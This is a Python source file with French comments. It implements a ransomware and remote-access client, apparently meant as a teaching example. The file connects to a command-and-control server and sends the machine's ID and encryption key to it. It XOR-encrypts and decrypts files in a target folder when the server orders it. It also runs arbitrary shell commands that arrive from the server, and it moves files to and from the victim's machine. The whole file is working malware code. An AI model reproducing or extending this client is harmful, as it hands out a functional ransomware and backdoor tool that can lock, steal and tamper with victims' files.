#!/usr/bin/env python3
import os
import socket
import random
import string

# Configuration du serveur C2
IP_SERVEUR = "127.0.0.1"
PORT_SERVEUR = 9526

def obtenir_uuid_machine():
    """Récupère l'UUID unique de la machine"""
    with open("/proc/sys/kernel/random/uuid", "r") as f:
        return f.read().strip()

def generer_cle_chiffrement():
    """Génère une clé aléatoire de 16 lettres majuscules A-Z"""
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(16))

def appliquer_xor(fichier, cle):
    """Chiffre ou déchiffre un fichier avec XOR (réversible)"""
    with open(fichier, "rb") as f:
        donnees = f.read()
    
    cle_octets = cle.encode()
    # XOR chaque octet du fichier avec la clé de manière cyclique
    resultat = bytearray(donnees[i] ^ cle_octets[i % len(cle_octets)] for i in range(len(donnees)))
    
    with open(fichier, "wb") as f:
        f.write(resultat)

def gerer_fichiers(cle, action):
    """Parcourt et chiffre/déchiffre tous les fichiers du dossier cible"""
    dossier = os.path.expanduser("~/Documents/CIBLE")
    
    # Créer le dossier et un fichier témoin si vide
    if not os.path.exists(dossier):
        os.makedirs(dossier)
    if not os.listdir(dossier):
        with open(os.path.join(dossier, "test.txt"), "w") as f:
            f.write("Fichier de test pour le ransomware pédagogique :)")
    
    count = 0
    # Parcours récursif de tous les fichiers
    for root, _, files in os.walk(dossier):
        for fichier in files:
            if fichier.endswith(".py"):  # Ignore les scripts Python
                continue
            try:
                appliquer_xor(os.path.join(root, fichier), cle)
                count += 1
            except:
                pass  # Ignore les erreurs (permissions, etc.)
    
    return f"{action} effectué sur {count} fichiers"

def demarrer_client():
    """Point d'entrée principal du malware"""
    # Génération de l'UUID et de la clé
    uuid = obtenir_uuid_machine()
    cle = generer_cle_chiffrement()
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((IP_SERVEUR, PORT_SERVEUR))
        except:
            return  # Arrêt silencieux si serveur inaccessible
        
        # Exfiltration immédiate des infos vers le C2
        sock.sendall(f"UUID:{uuid} | CLE:{cle}".encode())
        
        # Boucle d'attente et d'exécution des commandes
        while True:
            # Attend la réception d'une commande du serveur (bloquant jusqu'à réception)
            ordre = sock.recv(1024).decode().strip()
            # Si aucune donnée reçue, le serveur a fermé la connexion
            if not ordre:
                break
            
            # COMMANDE CHIFFRER
            if ordre == "chiffrer":
                # Lance le chiffrement XOR sur tous les fichiers du dossier cible
                reponse = gerer_fichiers(cle, "Chiffrement")
                # Renvoie le nombre de fichiers chiffrés au serveur
                sock.sendall(reponse.encode())
            
            # COMMANDE DECHIFFRER
            elif ordre == "dechiffrer":
                # Applique le même XOR pour déchiffrer (opération réversible)
                reponse = gerer_fichiers(cle, "Déchiffrement")
                sock.sendall(reponse.encode())
            
            # COMMANDE SYSTEM (exécution de commande shell)
            elif ordre == "system":
                # Attend la commande shell spécifique du serveur
                cmd = sock.recv(1024).decode()
                # Exécute la commande et récupère sa sortie (stdout + stderr)
                sortie = os.popen(cmd).read()
                # Envoie le résultat, ou un message par défaut si sortie vide
                sock.sendall((sortie or "Commande exécutée").encode())
            
            # COMMANDE DOWNLOAD (le serveur récupère un fichier de la victime)
            elif ordre == "download":
                # Reçoit le nom/chemin du fichier que le serveur veut récupérer
                nom_fichier = sock.recv(1024).decode()
                # Vérifie que le fichier existe sur la machine de la victime
                if os.path.exists(nom_fichier):
                    # Lit le contenu du fichier en mode binaire
                    with open(nom_fichier, "rb") as f:
                        data = f.read()
                    # Envoie d'abord la taille (sur 16 caractères fixes) pour que le serveur sache combien recevoir
                    sock.sendall(str(len(data)).encode().ljust(16))
                    # Envoie ensuite le contenu complet du fichier
                    sock.sendall(data)
                else:
                    # Si fichier inexistant, envoie un message d'erreur au serveur
                    sock.sendall(b"ERREUR".ljust(16))
            
            # COMMANDE UPLOAD (le serveur envoie un fichier à la victime)
            elif ordre == "upload":
                # Reçoit le nom sous lequel sauvegarder le fichier
                nom_fichier = sock.recv(1024).decode()
                # Reçoit la taille du fichier (16 octets fixes)
                taille = int(sock.recv(16).decode().strip())
                # Reçoit les données du fichier selon la taille annoncée
                data = sock.recv(taille)
                # Sauvegarde le fichier sur le disque de la victime
                with open(nom_fichier, "wb") as f:
                    f.write(data)
                # Confirme la réception au serveur
                sock.sendall(b"Fichier reçu avec succès")
            
            # COMMANDE EXIT (déconnexion propre)
            elif ordre in ["exit", "quitter"]:
                # Sort de la boucle pour fermer la connexion
                break
            
            # COMMANDE INCONNUE (sécurité)
            else:
                # Répond au serveur pour éviter qu'il reste bloqué en attente
                sock.sendall(b"Commande inconnue")

if __name__ == "__main__":
    demarrer_client()
